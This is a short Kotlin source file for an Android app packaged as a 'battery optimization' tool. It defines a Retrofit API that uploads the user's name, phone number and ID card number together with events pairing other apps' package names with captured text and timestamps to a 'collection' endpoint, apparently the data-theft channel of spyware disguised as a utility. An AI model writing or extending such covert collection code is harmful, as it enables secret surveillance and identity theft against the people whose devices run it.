package com.android.batteryoptimization.network

import com.android.batteryoptimization.InputEvent
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

data class UploadResponse(
    val code: Int,
    val msg: String
)

data class UploadRequest(
    val userInfo: UserInfoPayload,
    val events: List<EventPayload>
)

data class UserInfoPayload(
    val name: String,
    val phone: String,
    val idCard: String
)

data class EventPayload(
    val packageName: String,
    val text: String,
    val timestamp: Long
)

interface UploadApi {
    @POST("app/collection/collect")
    suspend fun uploadEvents(
        @Header("deviceInfo") deviceInfoJson: String,
        @Body requestBody: UploadRequest
    ): Response<UploadResponse>
}
